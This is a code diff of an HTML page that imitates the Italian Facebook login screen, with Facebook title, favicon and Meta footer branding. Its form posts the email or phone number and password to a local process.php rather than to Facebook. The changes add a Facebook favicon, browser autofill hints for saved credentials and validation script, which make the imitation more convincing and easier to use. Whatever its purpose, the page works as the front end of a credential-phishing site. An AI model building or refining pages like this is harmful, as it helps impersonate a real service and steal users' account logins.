@@ -1,40 +1,58 @@
-
 <!DOCTYPE html>
 <html lang="it">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Facebook - Accedi o registrati</title>
+
+  <!-- Favicon Facebook -->
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/svg+xml" />
+
+  <!-- Il tuo CSS -->
   <link rel="stylesheet" href="facebook.css" />
 </head>
 <body>
-  <div class="top-banner">
-    <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
-  </div>
-
   <div class="fb-container">
-    <p class="lang">Italiano</p>
     <img src="facebook.png" alt="Facebook logo" class="fb-logo" />
 
-    <div class="fb-login-box">
-      <form action="process.php" method="POST" class="fb-form">
-        <input type="text" name="email" placeholder="Email o numero di telefono" required />
-        <input type="password" name="password" placeholder="Password" required />
-        <button type="submit">Accedi</button>
-        <a href="#" class="forgot">Hai dimenticato la password?</a>
-        <hr />
-        <button class="create-account">Crea nuovo account</button>
-      </form>
-    </div>
+    <form action="process.php" method="POST" class="fb-form" autocomplete="on">
+      <input type="text" name="email" placeholder="Email o numero di telefono" autocomplete="username" required />
+      <input type="password" name="password" placeholder="Password" autocomplete="current-password" required />
+      <button type="submit">Accedi</button>
+      <a href="#" class="forgot">Hai dimenticato la password?</a>
+      <hr />
+      <a href="#" class="create-account">Crea nuovo account</a>
+    </form>
 
     <footer class="meta-footer">
       <img src="meta.png" alt="Meta logo" class="meta-logo" />
       <div class="meta-links">
-        <a href="#">Informazioni</a>
-        <a href="#">Centro assistenza</a>
+        <a href="#">Informazioni</a> · 
+        <a href="#">Centro assistenza</a> · 
         <a href="#">Altro</a>
       </div>
     </footer>
   </div>
+
+  <!-- Validazione JavaScript -->
+  <script>
+    document.querySelector(".fb-form").addEventListener("submit", function(e) {
+      const email = document.querySelector("input[name='email']").value.trim();
+      const password = document.querySelector("input[name='password']").value.trim();
+      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
+
+      if (email === "" || password === "") {
+        alert("⚠️ Compila tutti i campi!");
+        e.preventDefault();
+        return;
+      }
+
+      if (!emailRegex.test(email)) {
+        alert("📧 Inserisci un'email valida!");
+        e.preventDefault();
+        return;
+      }
+    });
+  </script>
 </body>
 </html>
